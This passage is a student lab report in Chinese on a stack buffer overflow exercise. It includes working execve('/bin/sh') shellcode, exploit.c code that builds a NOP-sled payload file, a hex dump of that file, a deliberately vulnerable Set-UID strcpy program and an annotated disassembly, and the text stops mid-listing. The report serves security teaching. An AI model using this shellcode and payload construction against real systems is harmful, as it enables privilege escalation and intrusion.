栈溢出攻击</h5><p>在此节中，文章以内存复制举例，如果复制到目标缓冲区的数据超过分配的空间，将会造成缓冲区溢出。简单的缓冲区溢出可能会让攻击者获得完全控制程序，获得特权</p><p>以strcpy ()举例，因为此函数只有遇到’&#x2F;0’才会停止复制，如果在分配的缓冲区大小之内没有找到’&#x2F;0’停止复制，就会造成将后续的内容继续向栈上复制，造成缓冲区溢出，会造成覆写返回地址或其他问题，文章中给了四种可能造成的后果</p><p>返回指令失败，程序崩溃</p><p>映射到保护的地址空间，跳转失败，程序崩溃</p><p>映射到非有效指令，返回失败，程序崩溃</p><p>返回到恰好的另一个有效指令，继续运行，但逻辑与原来不同（可能被恶意利用）</p><p>在4.3.3中 讲述了一个简单的利用栈溢出攻击，在调用复制函数到buffer的字符串中，将一个300字节的字符串(badfile)，复制到100字节大小的buffer中，导致了栈溢出，可以覆盖返回地址字段，跳转到恶意代码的地址，获得根特权</p><h5 id="4-4-实验设置"><a href="#4-4-实验设置" class="headerlink" title="4.4 实验设置"></a>4.4 实验设置</h5><p>禁用地址随机化</p><p>利用Set-UID根程序中的缓冲区溢出漏洞</p><p>SETUID 允许用户在运行程序时获得程序所有者的权限，实验中，将stack.c(被攻击的程序)作为目标程序，使其转换为root用户拥有的Set-UID程序。</p><h5 id="4-5-进行缓冲区溢出攻击"><a href="#4-5-进行缓冲区溢出攻击" class="headerlink" title="4.5 进行缓冲区溢出攻击"></a>4.5 进行缓冲区溢出攻击</h5><p>实验目标是利用stack.c的缓冲区溢出漏洞，其使用root特权运行，利用构造的badfile，将该内容复制到缓冲区之后造成溢出，执行注入的恶意代码，从而获得root shell</p><p>由于不知道恶意代码的内存地址，只知道其偏移量，需要知道函数栈帧地址，可以通过猜测方法（栈虚拟地址固定在一个起始地址+大多数程序栈不深）</p><h6 id="提高猜测机会方法"><a href="#提高猜测机会方法" class="headerlink" title="提高猜测机会方法"></a>提高猜测机会方法</h6><p>可以在代码入口点添加许多NOP指令，其可以将程序计数器推进到下一个位置，没有其他作用，所以多个NOP都可以作为代码入口地址，可以提高成功率</p><h6 id="不需要猜就找得到地址"><a href="#不需要猜就找得到地址" class="headerlink" title="不需要猜就找得到地址"></a>不需要猜就找得到地址</h6><p>可以使用调试方法找到栈帧在栈上的位置</p><p>通过调试获得了ebp和缓冲区地址，获得了返回地址字段和缓冲区起始地址，便得知了缓冲区起始地址与返回地址字段举例，可以构造badfile覆盖返回地址</p><p>通过文献中的构造，获得了root shell</p><h5 id="4-6-对于缓冲区地址和大小未知的攻击"><a href="#4-6-对于缓冲区地址和大小未知的攻击" class="headerlink" title="4.6 对于缓冲区地址和大小未知的攻击"></a>4.6 对于缓冲区地址和大小未知的攻击</h5><p>在文献中，给出了知道缓冲区大小和缓冲区地址的范围两种情况下的攻击方法和一般解决方案</p><p>如果知道缓冲区大小的范围，可以使用<em>spraying</em>技术，可以spray缓冲区，把返回地址放在所有可能的位置</p><p>如果知道缓冲区地址范围，也可以使用类似的方法，缓冲区地址为X，范围在[A,A+100] spray前120字节，并放置150字节NOP，在放置恶意代码，则</p><p>NOP范围可能在[A+120,A+270] ~ [A+220,A+370] 交集为 [A+220,A+270] 则无论X在[A,A+100]的那个值中，返回地址设为 [A+220,A+270] 都可以达成目标，跳转到恶意代码前的NOP中</p><h5 id="4-7-Shellcode"><a href="#4-7-Shellcode" class="headerlink" title="4.7 Shellcode"></a>4.7 Shellcode</h5><p>攻击者的目标是运行更多命令，可以注入一个shell程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode= (</span><br><span class="line">&quot;\x31\xc0&quot;    # xorl %eax,%eax</span><br><span class="line">&quot;\x50&quot;        # pushl %eax</span><br><span class="line">&quot;\x68&quot;&quot;//sh&quot;  # pushl $0x68732f2f</span><br><span class="line">&quot;\x68&quot;&quot;/bin&quot;  # pushl $0x6e69622f</span><br><span class="line">&quot;\x89\xe3&quot;    # movl %esp,%ebx set %ebx</span><br><span class="line">&quot;\x50&quot;        # pushl %eax</span><br><span class="line">&quot;\x53&quot;        # pushl %ebx</span><br><span class="line">&quot;\x89\xe1&quot;    # movl %esp,%ecx set %ecx</span><br><span class="line">&quot;\x99&quot;        # cdq set %edx</span><br><span class="line">&quot;\xb0\x0b&quot;    # movb $0x0b,%al set %eax</span><br><span class="line">&quot;\xcd\x80&quot;    # int $0x80 invoke execve()</span><br><span class="line">).encode(’latin-1’)</span><br></pre></td></tr></table></figure><p>shellcode代码核心部分是使用Executive()执行“&#x2F;bin&#x2F;sh”，需要设置四个寄存器</p><p>%eax: 必须包含11，是 Executive ()的系统调用号。</p><p>%ebx: 必须包含命令字符串的地址(例如“&#x2F;bin&#x2F;sh”)。</p><p>%ecx: 必须包含参数数组的地址; 在示例中，数组的第一个元素指向“&#x2F;bin&#x2F;sh”字符串，而第二个元素是0(表示数组的结束)。</p><p>%edx: 必须包含要传递给新程序的环境变量的地址。我们可以设置为0，因为我们不需要通过任何环境变量。</p><p>shellcode代码分为四个步骤：</p><p>1.查找”&#x2F;bin&#x2F;sh”地址 </p><p>xorl %eax,%eax 将eax设置为0    pushl %eax 将0入栈，表示&#x2F;bin&#x2F;sh结束</p><p>Pushl $0x68732f2f 将&#x2F;&#x2F;sh 入栈  </p><p>pushl $0x68737a2f 将&#x2F;bin入栈</p><p> Move% esp,% ebx 将字符串地址保存到%ebx中</p><p>2.查找name[] 地址，设置ecx 将0（第二项）入栈</p><p>pushl %ebx 入栈 因为其是name[]第一个元素的地址（”&#x2F;bin&#x2F;sh”地址）</p><p>3.将edx设为0</p><p>4.调用Executive() 将调用号11保存到eax中 move b $0x0b,% al (低八位) </p><p>int $80 切换到内核模式</p><p>以上内容为文献主题内容以及加入了部分自己的理解和思考，为文献阅读记录。</p><h4 id="2-按照-README，运行-exploit-程序，生成-badfile。利用-xxd-分析-badfile，同时分析-exploit-c-源代码，理解并解释为什么程序能够生成-badfile-的内容。"><a href="#2-按照-README，运行-exploit-程序，生成-badfile。利用-xxd-分析-badfile，同时分析-exploit-c-源代码，理解并解释为什么程序能够生成-badfile-的内容。" class="headerlink" title="2.按照 README，运行 exploit 程序，生成 badfile。利用 xxd 分析 badfile，同时分析 exploit.c 源代码，理解并解释为什么程序能够生成 badfile 的内容。"></a>2.按照 README，运行 exploit 程序，生成 badfile。利用 xxd 分析 badfile，同时分析 exploit.c 源代码，理解并解释为什么程序能够生成 badfile 的内容。</h4><p>README文件内容</p><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423174028605.png" alt="image-20230423174028605"></p><p>根据README文件，make生成相关文件， 运行exploit程序，生成badfile</p><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423174059064.png" alt="image-20230423174059064"></p><p>利用xxd分析badfile</p><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423174213969.png" alt="image-20230423174213969"></p><p>先分析exploit.c源代码</p><h5 id="分析exploit-c源代码"><a href="#分析exploit-c源代码" class="headerlink" title="分析exploit.c源代码"></a>分析exploit.c源代码</h5><p>exploit.c源代码片段如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[] =</span><br><span class="line">  <span class="string">&quot;\x31\xc0&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe3&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x53&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe1&quot;</span></span><br><span class="line">  <span class="string">&quot;\x99&quot;</span></span><br><span class="line">  <span class="string">&quot;\xb0\x0b&quot;</span></span><br><span class="line">  <span class="string">&quot;\xcd\x80&quot;</span></span><br><span class="line">;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据文献，shellcode代码的主要目的是设置好四个寄存器的值，从而进行系统调用执行，使用Executive()执行“&#x2F;bin&#x2F;sh”</p><p>根据在本文的1 文献阅读当中，参考文献中的shellcode代码，其汇编代码含义如下</p><p>“\x31\xc0”：      # xorl %eax,%eax   将eax设置为0   作为&#x2F;bin&#x2F;sh字符串的结尾</p><p>“\x50”:                # pushl %eax           将eax入栈，表示&#x2F;bin&#x2F;sh结束</p><p>“\x68””&#x2F;&#x2F;sh”：   # pushl $0x68732f2f  将&#x2F;&#x2F;sh入栈 其将被execve作为单斜杠处理</p><p> “\x68””&#x2F;bin”：  # pushl $0x6e69622f                 将&#x2F;bin入栈</p><p> “\x89\xe3”:       # movl %esp,%ebx set %ebx    将字符串地址保存到%ebx中 设置ebx</p><p>这些指令完成了目标的第一步，查找&#x2F;bin&#x2F;sh地址，设置寄存器%ebx</p><p>“\x50”# pushl %eax eax为0，压栈eax作为name[]第二个参数</p><p>“\x53”# pushl %ebx压栈%ebx,为name[]第一个参数的地址，(第一步中字符串地址)</p><p>“\x89\xe1”        # movl %esp,%ecx set %ecx      将%esp复制给%ecx，%esp目前为参数name[]地址，赋给%ecx</p><p>这几个指令查找name[] 地址，设置ecx 将0（第二项）入栈</p><p>“\x99”# cdq set %edx主要目的给edx置0,作为第四个寄存器的值</p><p>“\xb0\x0b”# movb $0x0b,%al set %eax  设置%eax为11，作为第一个寄存器的值</p><p>“\xcd\x80”# int $0x80 invoke execve()中断触发切换到内核模式，进行系统调用</p><p>shellcode 对应栈结构示意图</p><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423190031181.png" alt="image-20230423190031181"></p><p>继续分析exploit.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fillBuffer</span><span class="params">(<span class="type">char</span> buffer[BUFFER_SIZE])</span> &#123;</span><br><span class="line">  <span class="type">int</span> shellcodeSize = <span class="keyword">sizeof</span>(shellcode);<span class="comment">//获取shellcode大小</span></span><br><span class="line">  <span class="type">long</span> *returnAddress = (<span class="type">long</span> *) (buffer+OFFSET);  <span class="comment">//shell代码返回地址 缓冲区地址+偏移量(400bytes)</span></span><br><span class="line">  <span class="type">long</span> *bufferPtr = (<span class="type">long</span> *) buffer; <span class="comment">// 指向缓冲区每4个字节的十六进制数字，为长整数指针4字节</span></span><br><span class="line">  <span class="type">int</span> i;<span class="comment">//循环索引</span></span><br><span class="line">  <span class="type">int</span> shellcodeStartIndex = (BUFFER_SIZE-(shellcodeSize+<span class="number">1</span>));<span class="comment">//指向shellcode起始地址</span></span><br><span class="line">  <span class="type">int</span> shellcodeCounter = <span class="number">0</span>; <span class="comment">// shellcode计数器</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123; <span class="comment">// 循环25次，每次修改4个字节的栈内存地址</span></span><br><span class="line">    *bufferPtr = (<span class="type">long</span>) returnAddress; <span class="comment">// 写入预估的返回地址</span></span><br><span class="line">    bufferPtr++; <span class="comment">// 前往下一个4字节</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//上述代码思想应是对应spraying思想，不断向缓冲区覆写入返回地址，提高返回到恶意代码入口地址的概率</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">for</span> (i = shellcodeStartIndex; i &lt; (BUFFER_SIZE<span class="number">-1</span>); i++) &#123;<span class="comment">//在缓冲区末尾写入shell代码</span></span><br><span class="line">    buffer[i] = shellcode[shellcodeCounter];</span><br><span class="line">    shellcodeCounter++;</span><br><span class="line">  &#125;</span><br><span class="line">  buffer[BUFFER_SIZE<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;<span class="comment">//添加shellcode终止null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述函数填充缓冲区buffer，构造了badfile文件的一部分内容，</p><p>构成方式为   25个返回地址(25 * 4bytes &#x3D; 100bytes)* +   空   + shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="comment">//printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">  FILE *badfile;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buffer, <span class="number">0x90</span>, BUFFER_SIZE);  <span class="comment">// 使用0x90(NOP)初始化缓冲区</span></span><br><span class="line">  fillBuffer(buffer);<span class="comment">//根据上述函数填充缓冲区</span></span><br><span class="line">  badfile = fopen(<span class="string">&quot;./badfile&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(buffer, BUFFER_SIZE, <span class="number">1</span>, badfile);</span><br><span class="line">  fclose(badfile);<span class="comment">//将buffer中的内容存储为badfile文件，成功构造出了badfile文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main函数中，使用0x90初始化了buffer，再调用fillBuffer函数，将前100字节修改为返回地址，代码末尾修改为shellcode，成功构造了badfile，再来看前文中的badfile内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">badfile：</span><br><span class="line">00000000: c797 f8ff c797 f8ff c797 f8ff c797 f8ff  ................</span><br><span class="line">00000010: c797 f8ff c797 f8ff c797 f8ff c797 f8ff  ................</span><br><span class="line">00000020: c797 f8ff c797 f8ff c797 f8ff c797 f8ff  ................</span><br><span class="line">00000030: c797 f8ff c797 f8ff c797 f8ff c797 f8ff  ................</span><br><span class="line">00000040: c797 f8ff c797 f8ff c797 f8ff c797 f8ff  ................</span><br><span class="line">00000050: c797 f8ff c797 f8ff c797 f8ff c797 f8ff  ................</span><br><span class="line">00000060: c797 f8ff 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000070: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000080: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000090: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000100: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000110: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000120: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000130: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000140: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000150: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000160: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000170: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000180: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000190: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001e0: 9090 9090 9090 9090 9090 9031 c050 682f  ...........1.Ph/</span><br><span class="line">000001f0: 2f73 6868 2f62 696e 89e3 5053 89e1 99b0  /shh/bin..PS....</span><br><span class="line">00000200: 0bcd 8000 00                             .....</span><br></pre></td></tr></table></figure><p>可以看出，16进制下，badfile的前100字节填充了函数的返回地址，（每4字节为一组），中间均为NOP（0x90），末尾为shellcode。</p><p>总结，在本节中，分析了exploit.c 代码，它包括shellcode部分的目标及过程(前文所述)，以及fillbuffer函数将前100字节填充返回地址，中间部分用0x90初始化，末尾填充shellcode，通过这个过程，构造出了badfile。通过xxd badfile 观察badfile的16进制，其内容符合设计的预期。在本节中，详细分析了exploit.c 源代码是如何生成badfile的，以及shellcode在栈中的状态。</p><h4 id="3-按照-README-运行-stack-程序，实施栈溢出利用，观察-shellcode-的执行效果。"><a href="#3-按照-README-运行-stack-程序，实施栈溢出利用，观察-shellcode-的执行效果。" class="headerlink" title="3.按照 README 运行 stack 程序，实施栈溢出利用，观察 shellcode 的执行效果。"></a>3.按照 README 运行 stack 程序，实施栈溢出利用，观察 shellcode 的执行效果。</h4><p>运行stack程序，将代码注入到了栈上并调用，实施栈溢出利用</p><p>setarch i386 -R .&#x2F;stack （-R选项告诉setarch以不可重定位模式启动程序，代码和数据将加载到内存的固定位置中）</p><p><img src="C:\Users\地瓜干\AppData\Roaming\Typora\typora-user-images\image-20230423195305413.png" alt="image-20230423195305413"></p><p>获得了shell，成功利用了栈溢出漏洞</p><h4 id="4-详细分析-stack-asm-中的-main-函数及-bof-函数对应的汇编指令序列，画出从-main-起始到调用-bof-函数执行、再到返回-main-的过程中关键的栈状态。解释这些关键的栈状态，说明栈溢出攻击是如何实现的。（需要画出并解释的栈状态包括但不限于：call-fread-后，call-bof-前，bof-内-call-strcpy-前，bof-内-call-strcpy后，bof-内-ret-前，从-bof-返回-main-后）。"><a href="#4-详细分析-stack-asm-中的-main-函数及-bof-函数对应的汇编指令序列，画出从-main-起始到调用-bof-函数执行、再到返回-main-的过程中关键的栈状态。解释这些关键的栈状态，说明栈溢出攻击是如何实现的。（需要画出并解释的栈状态包括但不限于：call-fread-后，call-bof-前，bof-内-call-strcpy-前，bof-内-call-strcpy后，bof-内-ret-前，从-bof-返回-main-后）。" class="headerlink" title="4.详细分析 stack.asm 中的 main 函数及 bof 函数对应的汇编指令序列，画出从 main 起始到调用 bof 函数执行、再到返回 main 的过程中关键的栈状态。解释这些关键的栈状态，说明栈溢出攻击是如何实现的。（需要画出并解释的栈状态包括但不限于：call fread 后，call bof 前，bof 内 call strcpy 前，bof 内 call strcpy后，bof 内 ret 前，从 bof 返回 main 后）。"></a>4.详细分析 stack.asm 中的 main 函数及 bof 函数对应的汇编指令序列，画出从 main 起始到调用 bof 函数执行、再到返回 main 的过程中关键的栈状态。解释这些关键的栈状态，说明栈溢出攻击是如何实现的。（需要画出并解释的栈状态包括但不限于：call fread 后，call bof 前，bof 内 call strcpy 前，bof 内 call strcpy后，bof 内 ret 前，从 bof 返回 main 后）。</h4><p>stack.c源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 517 <span class="comment">// Represent the size of the buffer</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">24</span>];</span><br><span class="line"><span class="comment">//printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[BUFFER_SIZE];</span><br><span class="line">    FILE *badfile;</span><br><span class="line">    badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), BUFFER_SIZE, badfile);</span><br><span class="line">    bof(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stack.asm部分函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">080484d6 &lt;bof&gt;:</span><br><span class="line"> 80484d6:55                   push   %ebp</span><br><span class="line"> 80484d7:89 e5                mov    %esp,%ebp</span><br><span class="line"> 80484d9:53                   push   %ebx</span><br><span class="line"> 80484da:83 ec 24             sub    $0x24,%esp</span><br><span class="line"> 80484dd:e8 ab 00 00 00       call   804858d &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"> 80484e2:05 1e 1b 00 00       add    $0x1b1e,%eax</span><br><span class="line"> 80484e7:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 80484ea:ff 75 08             pushl  0x8(%ebp)</span><br><span class="line"> 80484ed:8d 55 e0             lea    -0x20(%ebp),%edx</span><br><span class="line"> 80484f0:52                   push   %edx</span><br><span class="line"> 80484f1:89 c3                mov    %eax,%ebx</span><br><span class="line"> 80484f3:e8 78 fe ff ff       call   8048370 &lt;strcpy@plt&gt;</span><br><span class="line"> 80484f8:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 80484fb:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line"> 8048500:8b 5d fc             mov    -0x4(%ebp),%ebx</span><br><span class="line"> 8048503:c9                   leave  </span><br><span class="line"> 8048504:c3                   ret    </span><br><span class="line"></span><br><span class="line">08048505 &lt;main&gt;:</span><br><span class="line"> 8048505:8d 4c 24 04          lea    0x4(%esp),%ecx</span><br><span class="line"> 8048509:83 e4 f0             and    $0xfffffff0,%esp</span><br><span class="line"> 804850c:ff 71 fc             pushl  -0x4(%ecx)</span><br><span class="line"> 804850f:55                   push   %ebp</span><br><span class="line"> 8048510:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048512:53                   push   %ebx</span><br><span class="line"> 8048513:51                   push   %ecx</span><br><span class="line"> 8048514:81 ec 10 02 00 00    sub    $0x210,%esp</span><br><span class="line"> 804851a:e8 f1 fe ff ff       call   8048410 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line"> 804851f:81 c3 e1 1a 00 00    add    $0x1ae1,%ebx</span><br><span class="line"> 8048525:83 ec 08             sub    $0x8,%esp</span><br><span class="line"> 8048528:8d 83 20 e6 ff ff    lea    -0x19e0(%ebx),%eax</span><br><span class="line"> 804852e:50                   push   %eax</span><br><span class="line"> 804852f:8d 83 22 e6 ff ff    lea    -0x19de(%ebx),%eax</span><br><span class="line"> 8048535:50                   push   %eax</span><br><span class="line"> 8048536:e8 65 fe ff ff       call   80483a0 &lt;fopen@plt&gt;</span><br><span class="line"> 804853b:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 804853e:89 45 f4             mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048541:ff 75 f4             pushl  -0xc(%ebp)</span><br><span class="line"> 8048544:68 05 02 00 00       push   $0x205</span><br><span class="line"> 8048549:6a 01                push   $0x1</span><br><span class="line"> 804854b:8d 85 ef fd ff ff    lea    -0x211(%ebp),%eax</span><br><span class="line"> 8048551:50                   push   %eax</span><br><span class="line"> 8048552:e8 09 fe ff ff       call   8048360 &lt;fread@plt&gt;</span><br><span class="line"> 8048557:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 804855a:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 804855d:8d 85 ef fd ff ff    lea    -0x211(%ebp),%eax</span><br><span class="line"> 8048563:50                   push   %eax</span><br><span class="line"> 8048564:e8 6d ff ff ff       call   80484d6 &lt;bof&gt;</span><br><span class="line"> 8048569:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 804856c:83 ec 0c             sub    $0xc,%esp</span><br><span class="line"> 804856f:8d 83 2a e6 ff ff    lea    -0x19d6(%ebx),%eax</span><br><span class="line"> 8048575:50                   push   %eax</span><br><span class="line"> 8048576:e8 05 fe ff ff       call   8048380 &lt;puts@plt&gt;</span><br><span class="line"> 804857b:83 c4 10             add    $0x10,%esp</span><br><span class="line"> 804857e:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line"> 8048583:8d 65 f8             lea    -0x8(%ebp),%esp</span><br><span class="line"> 8048586:59                   pop    %ecx</span><br><span class="line"> 8048587:5b                   pop    %ebx</span><br><span class="line"> 8048588:5d                   pop    %ebp</span><br><span class="line"> 8048589:8d 61 fc             lea    -0x4(%ecx),%esp</span><br><span class="line"> 804858c:c3                   ret    </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> 08048360 &lt;fread@plt&gt;:</span><br><span class="line"> 8048360:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048366:68 00 00 00 00       push   $0x0</span><br><span class="line"> 804836b:e9 e0 ff ff ff       jmp    8048350 &lt;.plt&gt;</span><br><span 